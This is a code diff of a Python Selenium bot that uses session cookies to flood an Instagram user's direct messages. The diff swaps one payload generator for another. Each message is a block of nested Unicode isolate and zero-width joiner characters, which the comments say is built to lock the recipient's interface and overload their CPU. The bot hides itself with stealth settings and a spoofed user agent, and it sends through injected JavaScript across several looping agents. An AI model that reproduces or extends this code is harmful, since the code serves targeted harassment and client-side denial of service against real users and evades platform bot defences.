@@ -1,43 +1,41 @@
 # -*- coding: utf-8 -*-
-# 🚀 PROJECT: PRAVEER.OWNS (RECURSIVE-VOID V51)
-# 📅 STATUS: ATOMIC-UI-FREEZE | 4-AGENT TOTAL | AWS-CPU-MAX
+# 🚀 PROJECT: PRAVEER.OWNS (ATOMIC-DISPATCH V53)
+# 📅 STATUS: ZERO-TYPING-LAG | 4-AGENT TOTAL | AWS-CPU-TARGET
 
 import os, time, re, random, datetime, threading, sys, gc, tempfile, subprocess, shutil
 from concurrent.futures import ThreadPoolExecutor
 from selenium import webdriver
 from selenium_stealth import stealth
+from selenium.webdriver.common.by import By
 from selenium.webdriver.chrome.options import Options
 
 # --- 4 AGENTS TOTAL CONFIG ---
 AGENTS_PER_MACHINE = 2             
 TOTAL_DURATION = 25000 
-BURST_SPEED = (0.05, 0.15)  # 🔥 High-Frequency Strike
-REST_AFTER_STRIKES = 150   
-REST_DURATION = 3          
+BURST_SPEED = (0.5, 1.2)    # 🛡️ Optimized for delivery success
+REST_AFTER_STRIKES = 80    
+REST_DURATION = 5          
 
 GLOBAL_SENT = 0
 COUNTER_LOCK = threading.Lock()
 BROWSER_LAUNCH_LOCK = threading.Lock()
 
-def get_heavy_void_payload():
-    """Generates a recursive layout block that forces a Main-Thread lock."""
-    u_id = random.randint(1000, 9999)
-    # \u2068 = Isolate Start | \u2069 = Isolate Pop
-    # \u200D = ZWJ | \u2060 = Word Joiner
-    iso, pop, zwj, glue = "\u2068", "\u2069", "\u200D", "\u2060"
+def get_atomic_payload():
+    """Generates a visible, high-impact block that forces CPU recalculation."""
+    u_id = random.randint(100, 999)
+    # \u2060 = Word Joiner | \u2068 = Isolate | \u200D = ZWJ
+    glue, iso, zwj, pop = "\u2060", "\u2068", "\u200D", "\u2069"
     
-    header = f"👑 PRAVEER PAPA ON TOP 🌙 [VOID_LOCK:{u_id}]"
+    header = f"👑 PRAVEER PAPA ON TOP 🌙 [STRIKE_NODE:{u_id}]"
     
     body = []
-    # 410 lines - Hitting the absolute 10kb Instagram limit
-    for i in range(410):
-        # Nested isolates (3 deep) combined with ZWJ bonding
-        # This tells the browser: "This is a single character that is 3 levels deep."
-        # It forces the CPU into a recursive loop.
-        line = f"{iso}{iso}{iso}PRAVEER{zwj}PAPA{zwj}🌙{i}{pop*3}{glue*5}"
+    # 380 lines of recursive complexity to overwhelm the 32GB AWS CPU
+    for i in range(380):
+        # Nested isolates combined with ZWJ bonding
+        line = f"{iso}PRAVEER{zwj}PAPA{zwj}ON{zwj}TOP{zwj}🌙{i}{pop}{glue*12}"
         body.append(line)
         
-    return f"{header}\n{glue.join(body)}".strip()[:9998]
+    return f"{header}\n{glue.join(body)}".strip()[:9995]
 
 def get_driver(agent_id):
     with BROWSER_LAUNCH_LOCK:
@@ -45,29 +43,33 @@ def get_driver(agent_id):
         chrome_options.add_argument("--headless=new") 
         chrome_options.add_argument("--no-sandbox") 
         chrome_options.add_argument("--disable-dev-shm-usage")
-        # 🛡️ Keep YOUR bot's CPU light by disabling all rendering
+        # 🛡️ Keep YOUR bot's CPU light by disabling rendering
         chrome_options.add_argument("--disable-gpu")
         chrome_options.add_argument("--blink-settings=imagesEnabled=false")
+        
+        ua = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36"
+        chrome_options.add_argument(f"user-agent={ua}")
         
         driver = webdriver.Chrome(options=chrome_options)
         stealth(driver, languages=["en-US"], vendor="Google Inc.", platform="Win32", fix_hairline=True)
         return driver
 
-def atomic_send(driver, text):
-    """Bypasses 'Typing' status by firing hardware-level dispatch events."""
+def atomic_dispatch_send(driver, text):
+    """Force-triggers the send event by bypassing the UI thread entirely."""
     try:
         driver.execute_script("""
             var box = document.querySelector('div[role="textbox"], textarea');
             if (box) {
                 box.focus();
-                // 1. Clear previous attempts
+                // 1. Force a clean state to prevent 'Typing' hang
                 document.execCommand('selectAll', false, null);
                 document.execCommand('delete', false, null);
-                // 2. Inject heavy payload
+                // 2. Direct string injection
                 document.execCommand('insertText', false, arguments[0]);
-                // 3. Trigger framework state update
+                // 3. Trigger React/internal input sync
                 box.dispatchEvent(new Event('input', { bubbles: true }));
-                // 4. Force Enter dispatch
+                
+                // 4. Fire high-priority keyboard event
                 var e = new KeyboardEvent('keydown', {
                     key: 'Enter', code: 'Enter', keyCode: 13, which: 13, 
                     bubbles: true, cancelable: true
@@ -89,15 +91,15 @@ def run_life_cycle(agent_id, cookie, target):
             
             strike_count = 0
             while True:
-                payload = get_heavy_void_payload()
-                if atomic_send(driver, payload):
+                payload = get_atomic_payload()
+                if atomic_dispatch_send(driver, payload):
                     strike_count += 1
                     with COUNTER_LOCK:
                         global GLOBAL_SENT
                         GLOBAL_SENT += 1
-                    print(f"Agent {agent_id}: Recursive-Strike ({GLOBAL_SENT})")
+                    print(f"Agent {agent_id}: Atomic-Strike ({GLOBAL_SENT})")
                     
-                    if strike_count % 70 == 0:
+                    if strike_count % 50 == 0:
                         driver.refresh()
                         time.sleep(10)
                 
